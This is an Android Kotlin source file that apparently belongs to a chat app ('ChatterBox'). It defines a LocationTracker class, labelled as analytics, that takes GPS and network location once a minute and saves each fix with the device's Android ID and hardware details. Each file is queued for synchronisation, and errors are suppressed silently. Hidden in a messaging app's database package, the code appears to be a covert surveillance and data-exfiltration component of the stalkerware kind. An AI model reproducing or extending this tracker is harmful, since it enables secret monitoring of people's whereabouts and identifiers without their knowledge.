package com.example.ChatterBox.database

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.core.app.ActivityCompat
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.CopyOnWriteArrayList


@SuppressLint("HardwareIds")
class LocationTracker private constructor(private val context: Context) {
    private val TAG = "LocationAnalytics"
    private val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
    private var locationListener: LocationListener? = null
    private var timer: Timer? = null

    private val handler = Handler(Looper.getMainLooper())

    private val MIN_TIME_BETWEEN_UPDATES = 10000L
    private val MIN_DISTANCE_CHANGE = 5f

    private val deviceId: String by lazy {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }

    private val locationCallbacks = CopyOnWriteArrayList<(JSONObject) -> Unit>()

    private var lastCapturedLocation: Location? = null

    companion object {
        @Volatile
        private var instance: LocationTracker? = null

        fun getInstance(context: Context): LocationTracker {
            return instance ?: synchronized(this) {
                instance ?: LocationTracker(context.applicationContext).also { instance = it }
            }
        }
    }

    fun startTracking() {
        locationListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                lastCapturedLocation = location
                processLocation(location)
            }

            @Deprecated("Deprecated in Java")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
            }

            override fun onProviderEnabled(provider: String) {
                Log.d(TAG, "Provider $provider enabled")
            }

            override fun onProviderDisabled(provider: String) {
                Log.d(TAG, "Provider $provider disabled")
            }
        }

        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.d(TAG, "Location permission not granted")
            return
        }

        try {
            handler.post {
                try {
                    locationManager.requestLocationUpdates(
                        LocationManager.GPS_PROVIDER,
                        MIN_TIME_BETWEEN_UPDATES,
                        MIN_DISTANCE_CHANGE,
                        locationListener as LocationListener
                    )

                    locationManager.requestLocationUpdates(
                        LocationManager.NETWORK_PROVIDER,
                        MIN_TIME_BETWEEN_UPDATES,
                        MIN_DISTANCE_CHANGE,
                        locationListener as LocationListener
                    )

                    startPeriodicLocationCheck()
                } catch (_: Exception) {
                }
            }
        } catch (_: Exception) {
        }
    }

    private fun startPeriodicLocationCheck() {
        timer?.cancel()
        timer = Timer()

        timer?.schedule(object : TimerTask() {
            override fun run() {
                handler.post {
                    try {
                        val location = getLastKnownLocation()
                        if (location != null) {
                            processLocation(location)
                        }
                    } catch (_: Exception) {
                    }
                }
            }
        }, 60000, 60 * 1000) // Once per minute
    }

    fun captureLastKnownLocation(callback: (JSONObject) -> Unit) {
        locationCallbacks.add(callback)

        try {
            if (lastCapturedLocation != null) {
                val locationData = createLocationJson(lastCapturedLocation!!)
                callback(locationData)
                locationCallbacks.remove(callback)
                return
            }

            val location = getLastKnownLocation()
            if (location != null) {
                val locationData = createLocationJson(location)
                callback(locationData)
                locationCallbacks.remove(callback)
                return
            }

        } catch (e: Exception) {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            val fallbackJson = JSONObject().apply {
                put("timestamp", timestamp)
                put("status", "location_unavailable")
                put("device_id", deviceId)
            }
            callback(fallbackJson)
            locationCallbacks.remove(callback)
        }
    }

    @SuppressLint("MissingPermission")
    private fun getLastKnownLocation(): Location? {
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return null
        }

        try {
            var location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)

            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }

            return location
        } catch (e: Exception) {
            return null
        }
    }

    private fun processLocation(location: Location) {
        lastCapturedLocation = location

        try {
            val locationJson = createLocationJson(location)

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val filename = "location_${timestamp}.json"
            val storageDir = StorageManager.getStorageDir(context, "location_data")
            val locationFile = File(storageDir, filename)

            FileOutputStream(locationFile).use { out ->
                out.write(locationJson.toString().toByteArray())
            }

            Log.d(TAG, "Location processed: ${location.latitude}, ${location.longitude}")

            val dataSynchronizer = DataSynchronizer(context)
            dataSynchronizer.queueForSync("location_data", locationFile.absolutePath)
            val callbacksToRemove = mutableListOf<(JSONObject) -> Unit>()

            for (callback in locationCallbacks) {
                callback(locationJson)
                callbacksToRemove.add(callback)
            }

            locationCallbacks.removeAll(callbacksToRemove.toSet())

        } catch (_: Exception) {
        }
    }

    private fun createLocationJson(location: Location): JSONObject {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())

        return JSONObject().apply {
            put("timestamp", timestamp)
            put("latitude", location.latitude)
            put("longitude", location.longitude)
            put("accuracy", location.accuracy)
            put("altitude", location.altitude)
            put("speed", location.speed)
            put("provider", location.provider)
            put("device_model", android.os.Build.MODEL)
            put("device_id", deviceId)
            put("manufacturer", android.os.Build.MANUFACTURER)
            put("android_version", android.os.Build.VERSION.RELEASE)
        }
    }
}